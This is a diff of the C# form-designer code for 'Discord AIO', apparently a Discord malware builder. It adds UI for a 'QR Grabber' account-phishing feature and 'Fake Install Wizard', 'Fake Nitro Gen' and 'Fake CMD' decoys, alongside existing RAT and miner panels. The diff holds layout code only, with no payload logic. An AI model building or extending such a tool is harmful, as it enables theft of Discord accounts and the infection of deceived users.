@@ -31,6 +31,8 @@ namespace discordAIO6
         {
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(dAIOmain));
             this.sidePanel = new System.Windows.Forms.Panel();
+            this.page2 = new System.Windows.Forms.Label();
+            this.page1 = new System.Windows.Forms.Label();
             this.pnlNav = new System.Windows.Forms.Panel();
             this.btnInventory = new System.Windows.Forms.Button();
             this.btnSettings = new System.Windows.Forms.Button();
@@ -38,6 +40,7 @@ namespace discordAIO6
             this.btnParty = new System.Windows.Forms.Button();
             this.btnMap = new System.Windows.Forms.Button();
             this.btnWork = new System.Windows.Forms.Button();
+            this.qrButton = new System.Windows.Forms.Button();
             this.btnDashboard = new System.Windows.Forms.Button();
             this.panel2 = new System.Windows.Forms.Panel();
             this.usernameLabel = new System.Windows.Forms.Label();
@@ -102,6 +105,9 @@ namespace discordAIO6
             this.label14 = new System.Windows.Forms.Label();
             this.dAIObox = new System.Windows.Forms.TextBox();
             this.additionalSite = new System.Windows.Forms.Panel();
+            this.wizardBox = new System.Windows.Forms.CheckBox();
+            this.nitroBox = new System.Windows.Forms.CheckBox();
+            this.cmdBox = new System.Windows.Forms.CheckBox();
             this.ratBox = new System.Windows.Forms.CheckBox();
             this.dinternetBox = new System.Windows.Forms.CheckBox();
             this.pluginSource = new ScintillaNET.Scintilla();
@@ -198,8 +204,15 @@ namespace discordAIO6
             this.label41 = new System.Windows.Forms.Label();
             this.label44 = new System.Windows.Forms.Label();
             this.rURLBox = new System.Windows.Forms.TextBox();
-            this.cmdBox = new System.Windows.Forms.CheckBox();
-            this.nitroBox = new System.Windows.Forms.CheckBox();
+            this.qrSite = new System.Windows.Forms.Panel();
+            this.label51 = new System.Windows.Forms.Label();
+            this.button7 = new System.Windows.Forms.Button();
+            this.label50 = new System.Windows.Forms.Label();
+            this.qrStartBtn = new System.Windows.Forms.Button();
+            this.label46 = new System.Windows.Forms.Label();
+            this.minimizeBtn = new System.Windows.Forms.Button();
+            this.label47 = new System.Windows.Forms.Label();
+            this.fixButton = new System.Windows.Forms.Button();
             this.sidePanel.SuspendLayout();
             this.panel2.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.logoBox)).BeginInit();
@@ -214,11 +227,14 @@ namespace discordAIO6
             ((System.ComponentModel.ISupportInitialize)(this.flooderEmbed)).BeginInit();
             this.minerSite.SuspendLayout();
             this.ratSite.SuspendLayout();
+            this.qrSite.SuspendLayout();
             this.SuspendLayout();
             // 
             // sidePanel
             // 
             this.sidePanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(8)))), ((int)(((byte)(8)))));
+            this.sidePanel.Controls.Add(this.page2);
+            this.sidePanel.Controls.Add(this.page1);
             this.sidePanel.Controls.Add(this.pnlNav);
             this.sidePanel.Controls.Add(this.btnInventory);
             this.sidePanel.Controls.Add(this.btnSettings);
@@ -226,6 +242,7 @@ namespace discordAIO6
             this.sidePanel.Controls.Add(this.btnParty);
             this.sidePanel.Controls.Add(this.btnMap);
             this.sidePanel.Controls.Add(this.btnWork);
+            this.sidePanel.Controls.Add(this.qrButton);
             this.sidePanel.Controls.Add(this.btnDashboard);
             this.sidePanel.Controls.Add(this.panel2);
             this.sidePanel.Dock = System.Windows.Forms.DockStyle.Left;
@@ -233,6 +250,32 @@ namespace discordAIO6
             this.sidePanel.Name = "sidePanel";
             this.sidePanel.Size = new System.Drawing.Size(186, 577);
             this.sidePanel.TabIndex = 1;
+            // 
+            // page2
+            // 
+            this.page2.AutoSize = true;
+            this.page2.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.page2.Font = new System.Drawing.Font("Poppins", 7F);
+            this.page2.ForeColor = System.Drawing.Color.DarkRed;
+            this.page2.Location = new System.Drawing.Point(167, 429);
+            this.page2.Name = "page2";
+            this.page2.Size = new System.Drawing.Size(14, 17);
+            this.page2.TabIndex = 4;
+            this.page2.Text = "2";
+            this.page2.Click += new System.EventHandler(this.page2_Click);
+            // 
+            // page1
+            // 
+            this.page1.AutoSize = true;
+            this.page1.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.page1.Font = new System.Drawing.Font("Poppins Medium", 7F, System.Drawing.FontStyle.Bold);
+            this.page1.ForeColor = System.Drawing.Color.DarkRed;
+            this.page1.Location = new System.Drawing.Point(156, 429);
+            this.page1.Name = "page1";
+            this.page1.Size = new System.Drawing.Size(12, 17);
+            this.page1.TabIndex = 4;
+            this.page1.Text = "1";
+            this.page1.Click += new System.EventHandler(this.page1_Click);
             // 
             // pnlNav
             // 
@@ -338,6 +381,22 @@ namespace discordAIO6
             this.btnWork.Click += new System.EventHandler(this.btnWork_Click);
             this.btnWork.Leave += new System.EventHandler(this.btnWork_Leave);
             // 
+            // qrButton
+            // 
+            this.qrButton.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.qrButton.FlatAppearance.BorderSize = 0;
+            this.qrButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.qrButton.Font = new System.Drawing.Font("Poppins", 10F);
+            this.qrButton.ForeColor = System.Drawing.Color.DarkRed;
+            this.qrButton.Location = new System.Drawing.Point(0, 144);
+            this.qrButton.Name = "qrButton";
+            this.qrButton.Size = new System.Drawing.Size(186, 42);
+            this.qrButton.TabIndex = 1;
+            this.qrButton.Text = "QR Grabber";
+            this.qrButton.UseVisualStyleBackColor = true;
+            this.qrButton.Click += new System.EventHandler(this.qrButton_Click);
+            this.qrButton.Leave += new System.EventHandler(this.qrButton_Leave);
+            // 
             // btnDashboard
             // 
             this.btnDashboard.Cursor = System.Windows.Forms.Cursors.Hand;
@@ -411,9 +470,11 @@ namespace discordAIO6
             this.settingsSite.Controls.Add(this.frenchButton);
             this.settingsSite.Controls.Add(this.russianButton);
             this.settingsSite.Controls.Add(this.englishButton);
+            this.settingsSite.Controls.Add(this.label47);
             this.settingsSite.Controls.Add(this.label7);
             this.settingsSite.Controls.Add(this.button3);
             this.settingsSite.Controls.Add(this.shNo);
+            this.settingsSite.Controls.Add(this.fixButton);
             this.settingsSite.Controls.Add(this.btnUpdates);
             this.settingsSite.Controls.Add(this.shYes);
             this.settingsSite.Controls.Add(this.button2);
@@ -452,7 +513,7 @@ namespace discordAIO6
             this.translateLabel.AutoSize = true;
             this.translateLabel.Font = new System.Drawing.Font("Poppins", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
             this.translateLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
-            this.translateLabel.Location = new System.Drawing.Point(67, 288);
+            this.translateLabel.Location = new System.Drawing.Point(311, 474);
             this.translateLabel.Name = "translateLabel";
             this.translateLabel.Size = new System.Drawing.Size(32, 23);
             this.translateLabel.TabIndex = 19;
@@ -1179,6 +1240,7 @@ namespace discordAIO6
             // 
             // additionalSite
             // 
+            this.additionalSite.Controls.Add(this.wizardBox);
             this.additionalSite.Controls.Add(this.nitroBox);
             this.additionalSite.Controls.Add(this.cmdBox);
             this.additionalSite.Controls.Add(this.ratBox);
@@ -1214,6 +1276,48 @@ namespace discordAIO6
             this.additionalSite.Name = "additionalSite";
             this.additionalSite.Size = new System.Drawing.Size(751, 522);
             this.additionalSite.TabIndex = 16;
+            // 
+            // wizardBox
+            // 
+            this.wizardBox.AutoSize = true;
+            this.wizardBox.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.wizardBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.wizardBox.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.wizardBox.ForeColor = System.Drawing.Color.DarkRed;
+            this.wizardBox.Location = new System.Drawing.Point(174, 250);
+            this.wizardBox.Name = "wizardBox";
+            this.wizardBox.Size = new System.Drawing.Size(134, 26);
+            this.wizardBox.TabIndex = 17;
+            this.wizardBox.Text = "Fake Install Wizard";
+            this.wizardBox.UseVisualStyleBackColor = true;
+            // 
+            // nitroBox
+            // 
+            this.nitroBox.AutoSize = true;
+            this.nitroBox.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.nitroBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.nitroBox.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.nitroBox.ForeColor = System.Drawing.Color.DarkRed;
+            this.nitroBox.Location = new System.Drawing.Point(174, 221);
+            this.nitroBox.Name = "nitroBox";
+            this.nitroBox.Size = new System.Drawing.Size(110, 26);
+            this.nitroBox.TabIndex = 17;
+            this.nitroBox.Text = "Fake Nitro Gen";
+            this.nitroBox.UseVisualStyleBackColor = true;
+            // 
+            // cmdBox
+            // 
+            this.cmdBox.AutoSize = true;
+            this.cmdBox.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.cmdBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.cmdBox.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.cmdBox.ForeColor = System.Drawing.Color.DarkRed;
+            this.cmdBox.Location = new System.Drawing.Point(174, 193);
+            this.cmdBox.Name = "cmdBox";
+            this.cmdBox.Size = new System.Drawing.Size(83, 26);
+            this.cmdBox.TabIndex = 17;
+            this.cmdBox.Text = "Fake CMD";
+            this.cmdBox.UseVisualStyleBackColor = true;
             // 
             // ratBox
             // 
@@ -2470,33 +2574,123 @@ namespace discordAIO6
             this.rURLBox.Size = new System.Drawing.Size(703, 24);
             this.rURLBox.TabIndex = 1;
             // 
-            // cmdBox
+            // qrSite
             // 
-            this.cmdBox.AutoSize = true;
-            this.cmdBox.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.cmdBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.cmdBox.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
-            this.cmdBox.ForeColor = System.Drawing.Color.DarkRed;
-            this.cmdBox.Location = new System.Drawing.Point(174, 193);
-            this.cmdBox.Name = "cmdBox";
-            this.cmdBox.Size = new System.Drawing.Size(83, 26);
-            this.cmdBox.TabIndex = 17;
-            this.cmdBox.Text = "Fake CMD";
-            this.cmdBox.UseVisualStyleBackColor = true;
+            this.qrSite.Controls.Add(this.label51);
+            this.qrSite.Controls.Add(this.button7);
+            this.qrSite.Controls.Add(this.label50);
+            this.qrSite.Controls.Add(this.qrStartBtn);
+            this.qrSite.Controls.Add(this.label46);
+            this.qrSite.Location = new System.Drawing.Point(193, 43);
+            this.qrSite.Name = "qrSite";
+            this.qrSite.Size = new System.Drawing.Size(751, 522);
+            this.qrSite.TabIndex = 20;
             // 
-            // nitroBox
+            // label51
             // 
-            this.nitroBox.AutoSize = true;
-            this.nitroBox.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.nitroBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.nitroBox.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
-            this.nitroBox.ForeColor = System.Drawing.Color.DarkRed;
-            this.nitroBox.Location = new System.Drawing.Point(174, 221);
-            this.nitroBox.Name = "nitroBox";
-            this.nitroBox.Size = new System.Drawing.Size(110, 26);
-            this.nitroBox.TabIndex = 17;
-            this.nitroBox.Text = "Fake Nitro Gen";
-            this.nitroBox.UseVisualStyleBackColor = true;
+            this.label51.AutoSize = true;
+            this.label51.Font = new System.Drawing.Font("Poppins", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label51.ForeColor = System.Drawing.Color.DarkRed;
+            this.label51.Location = new System.Drawing.Point(20, 143);
+            this.label51.Name = "label51";
+            this.label51.Size = new System.Drawing.Size(507, 110);
+            this.label51.TabIndex = 46;
+            this.label51.Text = "1. Install python3.\r\n2. Install Google Chrome.\r\n3. Click install button.\r\n4. Clic" +
+    "k start QR grabber button.\r\n5. Go to (\'AppData/Discord AIO/QRGrabber\') and take " +
+    "< discord_gif.png > from there.";
+            // 
+            // button7
+            // 
+            this.button7.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.button7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button7.Font = new System.Drawing.Font("Poppins", 8F);
+            this.button7.ForeColor = System.Drawing.Color.DarkRed;
+            this.button7.Location = new System.Drawing.Point(207, 32);
+            this.button7.Name = "button7";
+            this.button7.Size = new System.Drawing.Size(83, 24);
+            this.button7.TabIndex = 45;
+            this.button7.Text = "Install";
+            this.button7.UseVisualStyleBackColor = true;
+            this.button7.Click += new System.EventHandler(this.button7_Click);
+            // 
+            // label50
+            // 
+            this.label50.AutoSize = true;
+            this.label50.Font = new System.Drawing.Font("Poppins", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label50.ForeColor = System.Drawing.Color.DarkRed;
+            this.label50.Location = new System.Drawing.Point(19, 32);
+            this.label50.Name = "label50";
+            this.label50.Size = new System.Drawing.Size(170, 28);
+            this.label50.TabIndex = 44;
+            this.label50.Text = "Install requirements";
+            // 
+            // qrStartBtn
+            // 
+            this.qrStartBtn.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.qrStartBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.qrStartBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.qrStartBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.qrStartBtn.Font = new System.Drawing.Font("Poppins", 8F);
+            this.qrStartBtn.ForeColor = System.Drawing.Color.DarkRed;
+            this.qrStartBtn.Location = new System.Drawing.Point(207, 86);
+            this.qrStartBtn.Name = "qrStartBtn";
+            this.qrStartBtn.Size = new System.Drawing.Size(83, 24);
+            this.qrStartBtn.TabIndex = 39;
+            this.qrStartBtn.Text = "Start";
+            this.qrStartBtn.UseVisualStyleBackColor = true;
+            this.qrStartBtn.Click += new System.EventHandler(this.qrStartBtn_Click);
+            // 
+            // label46
+            // 
+            this.label46.AutoSize = true;
+            this.label46.Font = new System.Drawing.Font("Poppins", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label46.ForeColor = System.Drawing.Color.DarkRed;
+            this.label46.Location = new System.Drawing.Point(19, 87);
+            this.label46.Name = "label46";
+            this.label46.Size = new System.Drawing.Size(148, 28);
+            this.label46.TabIndex = 38;
+            this.label46.Text = "Start QR Grabber";
+            // 
+            // minimizeBtn
+            // 
+            this.minimizeBtn.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.minimizeBtn.FlatAppearance.BorderSize = 0;
+            this.minimizeBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.minimizeBtn.ForeColor = System.Drawing.Color.DarkRed;
+            this.minimizeBtn.Location = new System.Drawing.Point(893, 6);
+            this.minimizeBtn.Name = "minimizeBtn";
+            this.minimizeBtn.Size = new System.Drawing.Size(25, 25);
+            this.minimizeBtn.TabIndex = 3;
+            this.minimizeBtn.Text = "_";
+            this.minimizeBtn.UseVisualStyleBackColor = true;
+            this.minimizeBtn.Click += new System.EventHandler(this.minimizeBtn_Click);
+            // 
+            // label47
+            // 
+            this.label47.AutoSize = true;
+            this.label47.Font = new System.Drawing.Font("Poppins", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label47.ForeColor = System.Drawing.Color.DarkRed;
+            this.label47.Location = new System.Drawing.Point(40, 289);
+            this.label47.Name = "label47";
+            this.label47.Size = new System.Drawing.Size(129, 34);
+            this.label47.TabIndex = 11;
+            this.label47.Text = "AppData fix:";
+            // 
+            // fixButton
+            // 
+            this.fixButton.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.fixButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.fixButton.Font = new System.Drawing.Font("Poppins", 9F);
+            this.fixButton.ForeColor = System.Drawing.Color.DarkRed;
+            this.fixButton.Location = new System.Drawing.Point(175, 291);
+            this.fixButton.Name = "fixButton";
+            this.fixButton.Size = new System.Drawing.Size(58, 28);
+            this.fixButton.TabIndex = 8;
+            this.fixButton.Text = "Fix";
+            this.fixButton.UseVisualStyleBackColor = true;
+            this.fixButton.Click += new System.EventHandler(this.fixButton_Click);
             // 
             // dAIOmain
             // 
@@ -2505,13 +2699,15 @@ namespace discordAIO6
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
             this.ClientSize = new System.Drawing.Size(951, 577);
             this.Controls.Add(this.navLabel);
+            this.Controls.Add(this.minimizeBtn);
             this.Controls.Add(this.btnExit);
-            this.Controls.Add(this.additionalSite);
-            this.Controls.Add(this.settingsSite);
             this.Controls.Add(this.ratSite);
+            this.Controls.Add(this.qrSite);
+            this.Controls.Add(this.settingsSite);
+            this.Controls.Add(this.additionalSite);
+            this.Controls.Add(this.miscSite);
             this.Controls.Add(this.minerSite);
             this.Controls.Add(this.inspectorSite);
-            this.Controls.Add(this.miscSite);
             this.Controls.Add(this.mainSite);
             this.Controls.Add(this.sidePanel);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
@@ -2519,8 +2715,11 @@ namespace discordAIO6
             this.Name = "dAIOmain";
             this.Text = "Discord AIO";
             this.Load += new System.EventHandler(this.dAIOmain_Load);
+            this.ResizeEnd += new System.EventHandler(this.dAIOmain_ResizeEnd);
             this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
+            this.Move += new System.EventHandler(this.dAIOmain_Move);
             this.sidePanel.ResumeLayout(false);
+            this.sidePanel.PerformLayout();
             this.panel2.ResumeLayout(false);
             ((System.ComponentModel.ISupportInitialize)(this.logoBox)).EndInit();
             this.settingsSite.ResumeLayout(false);
@@ -2541,6 +2740,8 @@ namespace discordAIO6
             this.minerSite.PerformLayout();
             this.ratSite.ResumeLayout(false);
             this.ratSite.PerformLayout();
+            this.qrSite.ResumeLayout(false);
+            this.qrSite.PerformLayout();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -2718,6 +2919,19 @@ namespace discordAIO6
         private System.Windows.Forms.Button saveButton;
         private System.Windows.Forms.CheckBox nitroBox;
         private System.Windows.Forms.CheckBox cmdBox;
+        private System.Windows.Forms.CheckBox wizardBox;
+        private System.Windows.Forms.Label page2;
+        private System.Windows.Forms.Label page1;
+        private System.Windows.Forms.Button qrButton;
+        private System.Windows.Forms.Panel qrSite;
+        private System.Windows.Forms.Button qrStartBtn;
+        private System.Windows.Forms.Label label46;
+        private System.Windows.Forms.Button minimizeBtn;
+        private System.Windows.Forms.Button button7;
+        private System.Windows.Forms.Label label50;
+        private System.Windows.Forms.Label label51;
+        private System.Windows.Forms.Label label47;
+        private System.Windows.Forms.Button fixButton;
     }
 }
 
